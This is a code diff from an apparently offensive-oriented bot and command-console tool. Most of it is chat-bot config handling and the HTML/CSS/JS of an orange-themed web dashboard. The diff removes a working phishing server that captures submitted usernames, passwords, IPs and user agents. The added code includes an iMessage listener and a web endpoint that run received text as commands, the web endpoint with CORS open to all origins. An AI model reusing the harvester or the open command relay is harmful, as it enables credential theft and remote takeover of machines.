+            config = {'enabled': enabled, 'phone_number': phone_number, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "whatsapp_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
+    
+    def setup(self) -> bool:
+        return SELENIUM_AVAILABLE and self.config.get('phone_number')
     
     def start(self):
-        self.running = True
-        print(f"{Colors.SUCCESS}✅ WhatsApp bot initialized{Colors.RESET}")
+        if self.setup():
+            self.running = True
     
     def send_message(self, text: str):
         try:
             import pywhatkit
             pywhatkit.sendwhatmsg_instantly(self.config['phone_number'], text[:4000])
+            return True
         except:
-            pass
+            return False
+
 
 class GoogleChatBot:
     def __init__(self, handler, db: DatabaseManager):
         self.handler = handler
         self.db = db
         self.running = False
-        self.config = {'enabled': False, 'webhook_url': '', 'prefix': '/'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "googlechat_config.json")):
+                with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'webhook_url': '', 'space_id': '', 'prefix': '/'}
+    
+    def save_config(self, webhook_url: str, space_id: str = "", enabled: bool = True, prefix: str = '/') -> bool:
+        try:
+            config = {'enabled': enabled, 'webhook_url': webhook_url, 'space_id': space_id, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "googlechat_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
+    
+    def setup(self) -> bool:
+        return self.config.get('webhook_url') is not None
     
     def start(self):
-        self.running = True
-        print(f"{Colors.SUCCESS}✅ Google Chat bot initialized{Colors.RESET}")
+        if self.setup():
+            self.running = True
     
     def send_message(self, text: str):
         try:
             data = {'text': text[:4000]}
-            requests.post(self.config['webhook_url'], json=data, timeout=10)
+            headers = {'Content-Type': 'application/json'}
+            response = requests.post(self.config['webhook_url'], json=data, headers=headers, timeout=10)
+            return response.status_code == 200
         except:
-            pass
+            return False
+
 
 class iMessageBot:
     def __init__(self, handler, db: DatabaseManager):
         self.handler = handler
         self.db = db
         self.running = False
-        self.config = {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
+        self.config = self._load_config()
+    
+    def _load_config(self) -> Dict:
+        try:
+            if os.path.exists(os.path.join(CONFIG_DIR, "imessage_config.json")):
+                with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'r') as f:
+                    return json.load(f)
+        except:
+            pass
+        return {'enabled': False, 'phone_numbers': [], 'prefix': '!'}
+    
+    def save_config(self, phone_numbers: List[str], enabled: bool = True, prefix: str = '!') -> bool:
+        try:
+            config = {'enabled': enabled, 'phone_numbers': phone_numbers, 'prefix': prefix}
+            with open(os.path.join(CONFIG_DIR, "imessage_config.json"), 'w') as f:
+                json.dump(config, f, indent=4)
+            self.config = config
+            return True
+        except:
+            return False
+    
+    def setup(self) -> bool:
+        return IMESSAGE_AVAILABLE and self.config.get('phone_numbers')
     
     def start(self):
-        if IMESSAGE_AVAILABLE:
+        if self.setup():
+            thread = threading.Thread(target=self._run, daemon=True)
+            thread.start()
             self.running = True
-            print(f"{Colors.SUCCESS}✅ iMessage bot initialized{Colors.RESET}")
     
-    def send_message(self, text: str, phone: str = None):
+    def _run(self):
         if not IMESSAGE_AVAILABLE:
+            logger.error("iMessage only available on macOS")
             return
+        
+        while self.running:
+            try:
+                self._monitor_messages()
+                time.sleep(5)
+            except:
+                time.sleep(10)
+    
+    def _monitor_messages(self):
         try:
-            for number in self.config.get('phone_numbers', []):
+            script = """
+            tell application "Messages"
+                set recentMessages to every message of chat 1
+                repeat with msg in recentMessages
+                    if msg is not read then
+                        set msgText to content of msg
+                        set msgSender to handle of sender of msg
+                    end if
+                end repeat
+            end tell
+            """
+            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True, timeout=10)
+            
+            if result.stdout:
+                for line in result.stdout.splitlines():
+                    if line.startswith('!'):
+                        cmd = line[1:].strip()
+                        resp = self.handler.execute(cmd, 'imessage', 'imessage_user')
+                        self._send_message(resp.get('output', ''))
+        except:
+            pass
+    
+    def _send_message(self, text: str):
+        try:
+            for phone in self.config['phone_numbers']:
                 script = f'''
                 tell application "Messages"
                     set targetService to 1st service whose service type = iMessage
-                    set targetBuddy to buddy "{number}" of targetService
+                    set targetBuddy to buddy "{phone}" of targetService
                     send "{text[:4000]}" to targetBuddy
                 end tell
                 '''
                 subprocess.run(['osascript', '-e', script], capture_output=True, timeout=10)
         except:
             pass
+    
+    def send_message(self, text: str, phone: str = None):
+        self._send_message(text)
 
 # =====================
-# PHISHING SERVER
+# WEB DASHBOARD (Cyclopus Theme - Orange & White)
 # =====================
-class PhishingRequestHandler(BaseHTTPRequestHandler):
-    server_instance = None
-    
-    def log_message(self, format, *args):
-        pass
-    
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-Type', 'text/html')
-        self.end_headers()
-        
-        if self.server_instance and self.server_instance.html_content:
-            self.wfile.write(self.server_instance.html_content.encode())
-        
-        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
-            self.server_instance.db.conn.execute(
-                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
-                (self.server_instance.link_id,)
-            )
-            self.server_instance.db.conn.commit()
-    
-    def do_POST(self):
-        content_length = int(self.headers.get('Content-Length', 0))
-        post_data = self.rfile.read(content_length).decode()
-        form_data = urllib.parse.parse_qs(post_data)
-        
-        username = form_data.get('email', form_data.get('username', ['']))[0]
-        password = form_data.get('password', [''])[0]
-        client_ip = self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown')
-        
-        if self.server_instance and self.server_instance.db and username and password:
-            self.server_instance.db.save_captured_credential(
-                self.server_instance.link_id, username, password, client_ip, user_agent
-            )
-            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
-            print(f"  IP: {client_ip}")
-            print(f"  Username: {username}")
-            print(f"  Password: {password}")
-        
-        self.send_response(302)
-        self.send_header('Location', 'https://www.google.com')
-        self.end_headers()
-
-class PhishingServer:
-    def __init__(self, db: DatabaseManager):
+class WebDashboard:
+    def __init__(self, handler, db: DatabaseManager, config: ConfigManager):
+        self.handler = handler
         self.db = db
-        self.server = None
+        self.config = config
+        self.app = None
+        self.socketio = None
         self.running = False
-        self.link_id = None
-        self.html_content = None
     
-    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
-        try:
-            self.link_id = link_id
-            self.html_content = html_content
-            
-            handler = PhishingRequestHandler
-            handler.server_instance = self
-            
-            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
-            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+    def create_app(self):
+        if not WEB_AVAILABLE:
+            return None
+        
+        app = Flask(__name__)
+        app.config['SECRET_KEY'] = self.config.get('web.secret_key', secrets.token_hex(32))
+        CORS(app)
+        
+        socketio = SocketIO(app, cors_allowed_origins="*")
+        
+        # Cyclopus themed template (Orange & White)
+        TEMPLATE = '''
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>🐙 Mysterious Cyclopus - Command Console</title>
+            <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+            <style>
+                :root {
+                    --white: #ffffff;
+                    --off-white: #fff8f2;
+                    --paper: #fffdfb;
+                    --orange: #ff7a1a;
+                    --orange-deep: #e8600a;
+                    --orange-light: #ffb066;
+                    --orange-glow: #ffa04d;
+                    --ink: #2b2320;
+                    --ink-soft: #6b5c52;
+                    --line: #ffd9b3;
+                    --shadow: 0 10px 30px rgba(232,96,10,0.12);
+                    --shadow-lg: 0 20px 60px rgba(232,96,10,0.18);
+                    --radius: 18px;
+                }
+                * { margin: 0; padding: 0; box-sizing: border-box; }
+                body {
+                    font-family: 'Courier New', 'Consolas', monospace;
+                    background: var(--off-white);
+                    color: var(--ink);
+                    min-height: 100vh;
+                    background-image:
+                        radial-gradient(circle at 15% 20%, rgba(255,122,26,0.08), transparent 40%),
+                        radial-gradient(circle at 85% 80%, rgba(255,122,26,0.10), transparent 45%),
+                        linear-gradient(180deg, #fffefc 0%, #fff6ec 100%);
+                }
+                .wrap { max-width: 1400px; margin: 0 auto; padding: 28px 24px 60px; }
+                header.top {
+                    display: flex; align-items: center; justify-content: space-between;
+                    gap: 20px; padding: 18px 26px; background: var(--paper);
+                    border: 2px solid var(--line); border-radius: var(--radius);
+                    box-shadow: var(--shadow); margin-bottom: 26px;
+                    position: relative; overflow: hidden;
+                }
+                header.top::before {
+                    content: ""; position: absolute; top: -40%; left: -10%;
+                    width: 220px; height: 220px;
+                    background: radial-gradient(circle, rgba(255,122,26,0.18), transparent 70%);
+                    border-radius: 50%; pointer-events: none;
+                }
+                .brand { display: flex; align-items: center; gap: 16px; }
+                .brand .logo-dot {
+                    width: 46px; height: 46px; border-radius: 50%;
+                    background: radial-gradient(circle at 35% 30%, var(--orange-light), var(--orange-deep));
+                    box-shadow: 0 0 0 4px #fff, 0 0 0 6px var(--orange-light), 0 6px 18px rgba(232,96,10,0.4);
+                    position: relative; flex-shrink: 0;
+                    animation: pulseDot 2.6s ease-in-out infinite;
+                }
+                .brand .logo-dot::after {
+                    content: ""; position: absolute; inset: 12px; border-radius: 50%;
+                    background: #1a1310; box-shadow: inset 0 0 0 2px rgba(255,255,255,0.4);
+                }
+                @keyframes pulseDot {
+                    0%, 100% { transform: scale(1); }
+                    50% { transform: scale(1.12); }
+                }
+                .brand h1 {
+                    margin: 0; font-size: 26px; letter-spacing: 3px;
+                    color: var(--orange-deep);
+                    text-shadow: 0 2px 0 #fff, 0 0 18px rgba(255,122,26,0.25);
+                }
+                .brand .tagline {
+                    margin: 2px 0 0; font-size: 11px; letter-spacing: 4px;
+                    color: var(--ink-soft); text-transform: uppercase;
+                }
+                .status-pill {
+                    display: flex; align-items: center; gap: 10px;
+                    background: #fff3e6; border: 1px solid var(--line);
+                    padding: 8px 16px; border-radius: 999px; font-size: 12px;
+                    color: var(--orange-deep); font-weight: bold; letter-spacing: 1px;
+                }
+                .status-pill .blip {
+                    width: 9px; height: 9px; border-radius: 50%;
+                    background: #35c76b; box-shadow: 0 0 8px #35c76b;
+                    animation: blink 1.4s infinite;
+                }
+                @keyframes blink {
+                    0%, 100% { opacity: 1; }
+                    50% { opacity: 0.25; }
+                }
+                .grid { display: grid; grid-template-columns: 340px 1fr; gap: 24px; align-items: start; }
+                @media (max-width: 980px) { .grid { grid-template-columns: 1fr; } }
+                .panel {
+                    background: var(--paper); border: 2px solid var(--line);
+                    border-radius: var(--radius); box-shadow: var(--shadow);
+                    padding: 20px; position: relative;
+                }
+                .panel h2 {
+                    margin: 0 0 14px; font-size: 14px; letter-spacing: 2px;
+                    color: var(--orange-deep); text-transform: uppercase;
+                    display: flex; align-items: center; gap: 8px;
+                }
+                .panel h2::before {
+                    content: ""; width: 8px; height: 8px;
+                    background: var(--orange); border-radius: 2px;
+                    display: inline-block; transform: rotate(45deg);
+                }
+                .octo-stage {
+                    display: flex; flex-direction: column; align-items: center;
+                    justify-content: center; min-height: 320px; position: relative;
+                    background: radial-gradient(circle at 50% 30%, #fff3e6 0%, #fff 70%);
+                    border-radius: 14px; border: 1px dashed var(--line);
+                    overflow: hidden; padding: 10px;
+                }
+                .bubble {
+                    position: absolute; bottom: -20px; border-radius: 50%;
+                    background: rgba(255,122,26,0.12); border: 1px solid rgba(255,122,26,0.35);
+                    animation: floatUp linear infinite;
+                }
+                @keyframes floatUp {
+                    0% { transform: translateY(0) translateX(0); opacity: 0; }
+                    10% { opacity: 1; }
+                    100% { transform: translateY(-340px) translateX(var(--drift,10px)); opacity: 0; }
+                }
+                svg#octopus {
+                    width: 240px; height: 240px;
+                    filter: drop-shadow(0 12px 20px rgba(232,96,10,0.25));
+                }
+                .tentacle { transform-origin: top center; animation: sway 3.2s ease-in-out infinite; }
+                .tentacle:nth-child(1) { animation-delay: 0s; }
+                .tentacle:nth-child(2) { animation-delay: 0.15s; }
+                .tentacle:nth-child(3) { animation-delay: 0.3s; }
+                .tentacle:nth-child(4) { animation-delay: 0.45s; }
+                .tentacle:nth-child(5) { animation-delay: 0.6s; }
+                .tentacle:nth-child(6) { animation-delay: 0.75s; }
+                @keyframes sway {
+                    0%, 100% { transform: rotate(-6deg); }
+                    50% { transform: rotate(6deg); }
+                }
+                .eye-pupil { animation: lookAround 6s ease-in-out infinite; }
+                @keyframes lookAround {
+                    0%, 100% { transform: translate(0,0); }
+                    20% { transform: translate(3px,-2px); }
+                    40% { transform: translate(-3px,2px); }
+                    60% { transform: translate(2px,2px); }
+                    80% { transform: translate(-2px,-1px); }
+                }
+                .eye-lid { animation: blinkEye 5s infinite; transform-origin: center; }
+                @keyframes blinkEye {
+                    0%, 92%, 100% { transform: scaleY(0); }
+                    95% { transform: scaleY(1); }
+                }
+                .octo-caption {
+                    margin-top: 10px; font-size: 11px; letter-spacing: 2px;
+                    color: var(--ink-soft); text-transform: uppercase; text-align: center;
+                }
+                .octo-caption b { color: var(--orange-deep); }
+                .vitals { margin-top: 18px; display: flex; flex-direction: column; gap: 10px; }
+                .vital-row {
+                    display: flex; justify-content: space-between; align-items: center;
+                    font-size: 12px; padding: 8px 10px; background: #fff6ec;
+                    border: 1px solid var(--line); border-radius: 8px;
+                }
+                .vital-row span.label { color: var(--ink-soft); letter-spacing: 1px; }
+                .vital-row span.val { color: var(--orange-deep); font-weight: bold; }
+                .console { display: flex; flex-direction: column; gap: 16px; }
+                .terminal {
+                    background: #1c140e; border-radius: 14px;
+                    border: 2px solid var(--orange-deep);
+                    box-shadow: var(--shadow-lg), inset 0 0 40px rgba(255,122,26,0.06);
+                    overflow: hidden;
+                }
+                .term-titlebar {
+                    display: flex; align-items: center; gap: 8px;
+                    padding: 10px 14px;
+                    background: linear-gradient(180deg, #2a1d14, #1c140e);
+                    border-bottom: 1px solid rgba(255,122,26,0.25);
+                }
+                .term-titlebar .dot { width: 11px; height: 11px; border-radius: 50%; }
+                .dot.red { background: #ff5f57; }
+                .dot.yellow { background: #febc2e; }
+                .dot.green { background: #28c840; }
+                .term-titlebar .term-name {
+                    margin-left: 8px; font-size: 12px;
+                    color: var(--orange-light); letter-spacing: 2px;
+                }
+                #term-output {
+                    height: 360px; overflow-y: auto; padding: 16px 18px;
+                    font-size: 13px; line-height: 1.6; color: #ffd9ae;
+                }
+                #term-output::-webkit-scrollbar { width: 8px; }
+                #term-output::-webkit-scrollbar-thumb { background: var(--orange-deep); border-radius: 4px; }
+                #term-output::-webkit-scrollbar-track { background: #241a12; }
+                .line { margin-bottom: 4px; white-space: pre-wrap; word-break: break-word; }
+                .line .prompt-tag { color: #ff8c2e; }
+                .line.system { color: #9adfb0; }
+                .line.warn { color: #ffcf6b; }
+                .line.err { color: #ff7a7a; }
+                .line.info { color: #ffd9ae; }
+                .line.echo { color: #ffffff; }
+                .term-input-row {
+                    display: flex; align-items: center; gap: 10px;
+                    padding: 12px 16px; background: #24190f;
+                    border-top: 1px solid rgba(255,122,26,0.25);
+                }
+                .term-input-row .caret { color: var(--orange); font-weight: bold; }
+                #term-input {
+                    flex: 1; background: transparent; border: none;
+                    outline: none; color: #fff3e6; font-family: inherit;
+                    font-size: 14px; letter-spacing: 0.5px;
+                }
+                #term-input::placeholder { color: #7a5a41; }
+                .quick-cmds { display: flex; flex-wrap: wrap; gap: 8px; }
+                .quick-cmds button {
+                    background: #fff3e6; border: 1px solid var(--orange-light);
+                    color: var(--orange-deep); padding: 7px 14px;
+                    border-radius: 999px; font-size: 11px;
+                    letter-spacing: 1px; cursor: pointer;
+                    font-family: inherit; transition: all 0.15s ease;
+                }
+                .quick-cmds button:hover {
+                    background: var(--orange); color: #fff;
+                    transform: translateY(-2px);
+                    box-shadow: 0 6px 14px rgba(232,96,10,0.35);
+                }
+                .charts-row {
+                    display: grid; grid-template-columns: 1.3fr 1fr; gap: 20px;
+                }
+                @media (max-width: 760px) { .charts-row { grid-template-columns: 1fr; } }
+                canvas { width: 100%; display: block; }
+                .legend {
+                    display: flex; flex-wrap: wrap; gap: 10px 16px;
+                    margin-top: 12px; font-size: 11px;
+                }
+                .legend .item {
+                    display: flex; align-items: center; gap: 6px; color: var(--ink-soft);
+                }
+                .legend .swatch { width: 11px; height: 11px; border-radius: 3px; display: inline-block; }
+                .chart-foot {
+                    display: flex; justify-content: space-between; align-items: center; margin-top: 10px;
+                }
+                .refresh-btn {
+                    background: var(--orange); border: none; color: #fff;
+                    padding: 8px 16px; border-radius: 8px; font-size: 11px;
+                    letter-spacing: 1px; cursor: pointer; font-family: inherit;
+                    box-shadow: 0 6px 14px rgba(232,96,10,0.3);
+                    transition: transform 0.15s ease;
+                }
+                .refresh-btn:hover { transform: translateY(-2px); }
+                footer {
+                    text-align: center; margin-top: 30px; font-size: 11px;
+                    color: var(--ink-soft); letter-spacing: 2px;
+                }
+                footer b { color: var(--orange-deep); }
+                .glow-underline {
+                    height: 3px; width: 60px; margin: 8px auto 0;
+                    background: linear-gradient(90deg, transparent, var(--orange), transparent);
+                    border-radius: 2px;
+                }
+            </style>
+        </head>
+        <body>
+        <div class="wrap">
+            <header class="top">
+                <div class="brand">
+                    <div class="logo-dot"></div>
+                    <div>
+                        <h1>MYSTERIOUS CYCLOPUS</h1>
+                        <p class="tagline">Deep-Sea Command &amp; Data Console</p>
+                    </div>
+                </div>
+                <div class="status-pill">
+                    <span class="blip"></span>
+                    <span>SYSTEM ONLINE</span>
+                </div>
+            </header>
+
+            <div class="grid">
+                <!-- LEFT: Octopus + vitals -->
+                <div class="panel">
+                    <h2>Cyclopus Unit</h2>
+                    <div class="octo-stage" id="octoStage">
+                        <svg id="octopus" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
+                            <defs>
+                                <radialGradient id="headGrad" cx="35%" cy="30%" r="75%">
+                                    <stop offset="0%" stop-color="#ffb066"/>
+                                    <stop offset="60%" stop-color="#ff7a1a"/>
+                                    <stop offset="100%" stop-color="#e8600a"/>
+                                </radialGradient>
+                            </defs>
+                            <g stroke="#e8600a" stroke-width="10" fill="none" stroke-linecap="round">
+                                <path class="tentacle" d="M70,120 Q55,150 65,180" />
+                                <path class="tentacle" d="M85,130 Q75,165 85,195" />
+                                <path class="tentacle" d="M100,135 Q100,170 100,198" />
+                                <path class="tentacle" d="M115,130 Q125,165 115,195" />
+                                <path class="tentacle" d="M130,120 Q145,150 135,180" />
+                                <path class="tentacle" d="M60,105 Q40,125 45,155" />
+                            </g>
+                            <ellipse cx="100" cy="95" rx="60" ry="55" fill="url(#headGrad)" stroke="#c9540a" stroke-width="2"/>
+                            <circle cx="100" cy="92" r="30" fill="#fffdfb" stroke="#c9540a" stroke-width="2"/>
+                            <g class="eye-pupil">
+                                <circle cx="100" cy="92" r="15" fill="#241a12"/>
+                                <circle cx="94" cy="86" r="4" fill="#fff"/>
+                            </g>
+                            <rect class="eye-lid" x="70" y="62" width="60" height="30" fill="url(#headGrad)"/>
+                            <ellipse cx="75" cy="65" rx="14" ry="8" fill="#ffd9ae" opacity="0.6"/>
+                        </svg>
+                    </div>
+                    <p class="octo-caption">Status: <b id="octoMood">CALM &amp; WATCHFUL</b></p>
+                    <div class="glow-underline"></div>
+
+                    <div class="vitals">
+                        <div class="vital-row"><span class="label">INK RESERVE</span><span class="val" id="v-ink">92%</span></div>
+                        <div class="vital-row"><span class="label">TENTACLE SYNC</span><span class="val" id="v-sync">88%</span></div>
+                        <div class="vital-row"><span class="label">SIGNAL DEPTH</span><span class="val" id="v-depth">312m</span></div>
+                        <div class="vital-row"><span class="label">UPTIME</span><span class="val" id="v-uptime">00:00:00</span></div>
+                    </div>
+                </div>
+
+                <!-- RIGHT: Console + charts -->
+                <div class="console">
+                    <div class="panel">
+                        <h2>Command Uplink</h2>
+                        <div class="terminal">
+                            <div class="term-titlebar">
+                                <span class="dot red"></span>
+                                <span class="dot yellow"></span>
+                                <span class="dot green"></span>
+                                <span class="term-name">cyclopus@abyss:~$</span>
+                            </div>
+                            <div id="term-output"></div>
+                            <div class="term-input-row">
+                                <span class="caret">&gt;</span>
+                                <input type="text" id="term-input" placeholder="type 'help' to see available commands..." autocomplete="off" spellcheck="false"/>
+                            </div>
+                        </div>
+                        <br/>
+                        <div class="quick-cmds">
+                            <button data-cmd="help">help</button>
+                            <button data-cmd="status">status</button>
+                            <button data-cmd="scan">scan</button>
+                            <button data-cmd="data">data</button>
+                            <button data-cmd="ink">ink cloud</button>
+                            <button data-cmd="wave">wave tentacles</button>
+                            <button data-cmd="clear">clear</button>
+                        </div>
+                    </div>
+
+                    <div class="panel">
+                        <h2>Telemetry Charts</h2>
+                        <div class="charts-row">
+                            <div>
+                                <canvas id="barChart" width="480" height="280"></canvas>
+                                <div class="legend" id="barLegend"></div>
+                            </div>
+                            <div>
+                                <canvas id="pieChart" width="280" height="280"></canvas>
+                                <div class="legend" id="pieLegend"></div>
+                            </div>
+                        </div>
+                        <div class="chart-foot">
+                            <span style="font-size:11px;color:var(--ink-soft);letter-spacing:1px;">LIVE SIMULATED DATA STREAM</span>
+                            <button class="refresh-btn" id="refreshChartsBtn">REFRESH DATA</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <footer>
+                <b>MYSTERIOUS CYCLOPUS</b> &mdash; ORANGE &amp; WHITE COMMAND CONSOLE &mdash; ALL DATA SIMULATED CLIENT-SIDE
+            </footer>
+        </div>
+
+        <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+        <script>
+            var socket = io();
+            function pad(n){ return n.toString().padStart(2,'0'); }
+            function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+            function fmtTime(sec){
+                const h = Math.floor(sec/3600);
+                const m = Math.floor((sec%3600)/60);
+                const s = Math.floor(sec%60);
+                return pad(h)+":"+pad(m)+":"+pad(s);
+            }
+
+            let uptimeSeconds = 0;
+            setInterval(()=>{
+                uptimeSeconds++;
+                document.getElementById('v-uptime').textContent = fmtTime(uptimeSeconds);
+            }, 1000);
+
+            setInterval(()=>{
+                const ink = document.getElementById('v-ink');
+                const sync = document.getElementById('v-sync');
+                const depth = document.getElementById('v-depth');
+                let inkVal = parseInt(ink.textContent);
+                let syncVal = parseInt(sync.textContent);
+                inkVal = Math.min(100, Math.max(40, inkVal + randInt(-3,3)));
+                syncVal = Math.min(100, Math.max(50, syncVal + randInt(-2,4)));
+                ink.textContent = inkVal + '%';
+                sync.textContent = syncVal + '%';
+                depth.textContent = randInt(280,420) + 'm';
+            }, 4000);
+
+            const octoStage = document.getElementById('octoStage');
+            function spawnBubble(){
+                const b = document.createElement('div');
+                b.className = 'bubble';
+                const size = randInt(6,18);
+                b.style.width = size+'px';
+                b.style.height = size+'px';
+                b.style.left = randInt(5,95)+'%';
+                b.style.setProperty('--drift', randInt(-30,30)+'px');
+                b.style.animationDuration = randInt(4,9)+'s';
+                octoStage.appendChild(b);
+                setTimeout(()=> b.remove(), 9000);
+            }
+            setInterval(spawnBubble, 700);
+            for(let i=0;i<6;i++) setTimeout(spawnBubble, i*300);
+
+            const octoMood = document.getElementById('octoMood');
+            const octopusSvg = document.getElementById('octopus');
+
+            function setMood(text){ octoMood.textContent = text; }
+
+            function waveTentaclesBurst(){
+                const tentacles = document.querySelectorAll('.tentacle');
+                tentacles.forEach((t,i)=>{
+                    t.style.animation = 'none';
+                    void t.offsetWidth;
+                    t.style.animation = `sway 0.6s ease-in-out ${i*0.05}s 4`;
+                });
+                setMood('TENTACLES ACTIVE');
+                setTimeout(()=> setMood('CALM & WATCHFUL'), 3000);
+            }
+
+            function inkCloudEffect(){
+                setMood('RELEASING INK CLOUD...');
+                octopusSvg.style.transition = 'filter 0.4s ease';
+                octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(43,35,32,0.55)) brightness(0.6)';
+                setTimeout(()=>{
+                    octopusSvg.style.filter = 'drop-shadow(0 12px 20px rgba(232,96,10,0.25))';
+                    setMood('CALM & WATCHFUL');
+                }, 1400);
+            }
+
+            const outputEl = document.getElementById('term-output');
+            const inputEl = document.getElementById('term-input');
+
+            function printLine(text, cls){
+                const div = document.createElement('div');
+                div.className = 'line ' + (cls || 'info');
+                div.textContent = text;
+                outputEl.appendChild(div);
+                outputEl.scrollTop = outputEl.scrollHeight;
+            }
+
+            const BOOT_LINES = [
+                ['booting cyclopus core kernel...', 'system'],
+                ['loading tentacle drivers ......... OK', 'system'],
+                ['calibrating single-eye sensor .... OK', 'system'],
+                ['establishing abyssal uplink ...... OK', 'system'],
+                ['MYSTERIOUS CYCLOPUS v1.0 ready.', 'system'],
+                ["type 'help' to view available commands.", 'info'],
+            ];
+
+            function bootSequence(){
+                let i = 0;
+                const interval = setInterval(()=>{
+                    if(i >= BOOT_LINES.length){ clearInterval(interval); return; }
+                    printLine(BOOT_LINES[i][0], BOOT_LINES[i][1]);
+                    i++;
+                }, 220);
+            }
+
+            const HELP_TEXT = `
+AVAILABLE COMMANDS:
+  help              show this help menu
+  status            show system status report
+  scan <target>     run a quick scan on target
+  data              print current telemetry dataset
+  chart / refresh   regenerate bar & pie chart data
+  ink               trigger ink cloud animation
+  wave              trigger tentacle wave animation
+  mood <text>       set cyclopus mood label
+  ping <host>       simulate a network ping
+  whoami            show current operator identity
+  date              show current date/time
+  theme             show theme info
+  history           show command history
+  clear             clear the terminal screen
+
+For full command list, type 'help full' or use the API.
+`;
+
+            let commandHistory = [];
+            let historyIndex = -1;
+
+            function handleCommand(raw){
+                const trimmed = raw.trim();
+                if(trimmed.length === 0) return;
+
+                printLine('> ' + trimmed, 'echo');
+                commandHistory.push(trimmed);
+                historyIndex = commandHistory.length;
+
+                const parts = trimmed.split(/\\s+/);
+                const cmd = parts[0].toLowerCase();
+                const args = parts.slice(1);
+
+                // Send to backend for real execution
+                fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command: trimmed })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        printLine(data.output, 'system');
+                    } else {
+                        printLine(data.output || 'Command failed', 'err');
+                    }
+                })
+                .catch(err => {
+                    printLine('Backend error: ' + err, 'err');
+                });
+            }
+
+            inputEl.addEventListener('keydown', (e)=>{
+                if(e.key === 'Enter'){
+                    const val = inputEl.value;
+                    inputEl.value = '';
+                    handleCommand(val);
+                } else if(e.key === 'ArrowUp'){
+                    e.preventDefault();
+                    if(commandHistory.length){
+                        historyIndex = Math.max(0, historyIndex - 1);
+                        inputEl.value = commandHistory[historyIndex] || '';
+                    }
+                } else if(e.key === 'ArrowDown'){
+                    e.preventDefault();
+                    if(commandHistory.length){
+                        historyIndex = Math.min(commandHistory.length, historyIndex + 1);
+                        inputEl.value = commandHistory[historyIndex] || '';
+                    }
+                }
+            });
+
+            document.querySelectorAll('.quick-cmds button').forEach(btn=>{
+                btn.addEventListener('click', ()=>{
+                    const cmd = btn.getAttribute('data-cmd');
+                    inputEl.value = cmd;
+                    handleCommand(cmd);
+                    inputEl.value = '';
+                    inputEl.focus();
+                });
+            });
+
+            const ORANGE_PALETTE = ['#ff7a1a', '#ffa04d', '#ffc285', '#e8600a', '#ffd9b3', '#c9540a'];
+            let barLabels = ['SCANS', 'PINGS', 'ALERTS', 'UPLINKS', 'ANOMALY'];
+            let barData = [];
+            let pieLabels = ['CALM WATERS', 'MILD CURRENT', 'HIGH ALERT', 'UNKNOWN'];
+            let pieData = [];
+
+            function randomizeData(){
+                barData = barLabels.map(()=> randInt(10, 100));
+                let remaining = 100;
+                pieData = pieLabels.map((label, idx)=>{
+                    if(idx === pieLabels.length - 1) return remaining;
+                    const val = randInt(5, Math.max(6, Math.floor(remaining/2)));
+                    remaining -= val;
+                    return val;
+                });
+            }
+            randomizeData();
+
+            const barCanvas = document.getElementById('barChart');
+            const barCtx = barCanvas.getContext('2d');
+
+            function drawBarChart(){
+                const w = barCanvas.width;
+                const h = barCanvas.height;
+                barCtx.clearRect(0,0,w,h);
+
+                const padding = { top: 20, right: 20, bottom: 40, left: 40 };
+                const chartW = w - padding.left - padding.right;
+                const chartH = h - padding.top - padding.bottom;
+                const maxVal = Math.max(...barData, 10) * 1.15;
+
+                barCtx.strokeStyle = '#ffe4c4';
+                barCtx.lineWidth = 1;
+                const gridLines = 4;
+                for(let i=0;i<=gridLines;i++){
+                    const y = padding.top + (chartH / gridLines) * i;
+                    barCtx.beginPath();
+                    barCtx.moveTo(padding.left, y);
+                    barCtx.lineTo(w - padding.right, y);
+                    barCtx.stroke();
+
+                    const val = Math.round(maxVal - (maxVal/gridLines)*i);
+                    barCtx.fillStyle = '#a9948a';
+                    barCtx.font = '10px Courier New';
+                    barCtx.textAlign = 'right';
+                    barCtx.fillText(val, padding.left - 8, y + 3);
+                }
+
+                const n = barData.length;
+                const gap = 18;
+                const barW = (chartW - gap*(n-1)) / n;
+
+                barData.forEach((val, idx)=>{
+                    const barH = (val / maxVal) * chartH;
+                    const x = padding.left + idx * (barW + gap);
+                    const y = padding.top + chartH - barH;
+
+                    const grad = barCtx.createLinearGradient(0, y, 0, y+barH);
+                    grad.addColorStop(0, ORANGE_PALETTE[idx % ORANGE_PALETTE.length]);
+                    grad.addColorStop(1, '#ffcf9e');
+
+                    barCtx.fillStyle = grad;
+                    roundRect(barCtx, x, y, barW, barH, 6);
+                    barCtx.fill();
+
+                    barCtx.fillStyle = '#e8600a';
+                    barCtx.font = 'bold 11px Courier New';
